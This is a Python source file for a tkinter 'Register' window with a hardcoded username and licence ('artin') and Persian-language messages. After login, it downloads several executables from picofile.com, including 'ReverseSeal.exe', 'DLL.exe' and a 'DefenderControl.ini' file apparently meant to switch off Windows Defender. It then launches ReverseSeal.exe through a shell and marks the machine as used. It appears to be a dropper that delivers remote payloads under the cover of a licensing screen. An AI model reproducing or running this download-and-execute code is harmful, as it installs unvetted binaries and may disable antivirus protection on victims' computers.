from tkinter import *
from tkinter import messagebox
import wget
import subprocess

managepath = "ReverseSeal.exe"

surl1 = 'https://s27.picofile.com/d/8458175518/df86c1f1-1a6c-4654-b3f2-497541172e36/Cleaned.exe'
surl2 = 'https://s26.picofile.com/d/8458175534/8062b5d8-cf8f-4962-b77c-87acbf90d8aa/DefenderControl.ini'
surl3 = 'https://s27.picofile.com/d/8458175550/eb16cc38-59d2-45a6-b5bb-41529e3a64fd/DLL.exe'
surl4 = 'https://s26.picofile.com/d/8458175692/ab16b3d8-66b6-49ac-999c-61a6e2a98153/ReverseSeal.exe'
surl5 = 'https://s27.picofile.com/d/8458618668/c0d42be5-dff9-4640-8655-911837198d9d/spdt.json'

print ("v.1")

try:
    file_name = "spdt.json"
    file = open( file_name, "r+" )
    usagec = file.read()
    file.close()
except:
    print ("----------------------------------------------------------------")
    print ("Please restart !")
    print ("----------------------------------------------------------------")
    egt = input ("Press ENTER to Exit !")
    wget.download(surl5, 'spdt.json')
    quit()

tl = ""

usernamet = "artin"
passwordt = "artin"


print ("----------------------------------------------------------------")
np = tl

if np == tl:
    if usagec == "tsd":
        def login():
            username = entry1.get()
            password = entry2.get()
            if (username == usernamet and password == passwordt):
                messagebox.showinfo("","اطلاعات صحیح است ! ") 
                try:
                    dlfile = "dlfile.json"
                    dlfile2 = open(dlfile, "r+")
                    dlst = dlfile2.read()
                    dlfile2.close()
                except:
                    dlfile = "dlfile.json"
                    dlfile2 = open(dlfile, "w")
                    dlfile2.write("dlncom")
                    dlfile2.close()
                dlfile = "dlfile.json"
                dlfile2 = open(dlfile, "r+")
                dlst = dlfile2.read()
                dlfile2.close()
                if dlst == "dlncom":
                    print ("----------------------------------------------------------------")
                    print ("Downloading...")
                    wget.download(surl1, 'Cleaned.exe')
                    wget.download(surl2, 'DefenderControl.ini')
                    wget.download(surl3, 'DLL.exe')
                    wget.download(surl4, 'ReverseSeal.exe')
                    print ("----------------------------------------------------------------")
                    print ("Downloads Completed")
                    print ("----------------------------------------------------------------")
                    dlfile = "dlfile.json"
                    dlfile2 = open(dlfile, "w")
                    dlfile2.write("dlcom")
                    dlfile2.close()
                    p = subprocess.Popen(managepath, shell=True, stdout = subprocess.PIPE)
                    file_name2 = "spdt.json"
                    file2 = open(file_name2, "w")
                    file2.write("tsb")
                    file2.close()
                    quit()
                elif dlst == "dlcom":
                    p = subprocess.Popen(managepath, shell=True, stdout = subprocess.PIPE)
                    file_name2 = "spdt.json"
                    file2 = open(file_name2, "w")
                    file2.write("tsb")
                    file2.close()
                    quit()
                else:
                    print ("Error 02")
                    quit()
            elif (username == "" and password == ""):
                messagebox.showinfo("","لطفا فیلد ها را پر کنید !")
            else:
                messagebox.showinfo("","اطلاعات وارد شده صحیح نیست !")

    elif usagec == "tsb":
        print ("already used!")
        def login():
            username = entry1.get()
            password = entry2.get()
            messagebox.showinfo("","قبلا در این کامپیوتر استقاده شده است !")

    else:
        print ("please restart !")
        file_name3 = "spdt.json"
        file3 = open(file_name3, "w")
        file3.write("tsb")
        file3.close()
        def login():
            username = entry1.get()
            password = entry2.get()
            messagebox.showinfo("","لطفا فایل را بسته و دوباره باز کنید !")

    root = Tk()
    root.title("Register")
    root.geometry("300x200")

    global entry1
    global entry2

    Label(root,text = "Username").place(x = 20,y = 20)
    Label(root,text = "Licence").place(x = 20,y = 70)

    entry1 = Entry(root,bd = 5)
    entry1.place(x = 140, y = 20)

    entry2 = Entry(root,bd = 5)
    entry2.place(x = 140, y = 70)

    Button(root,text = "REGISTER",command = login,height = 3,width = 13,bd = 6).place(x = 100, y = 120)


    root.mainloop()

else:
    print ("----------------------------------------------------------------")
    print ("Wrong licence")
    print ("----------------------------------------------------------------")
    eg = input ("Press ENTER to Exit !")
    quit()
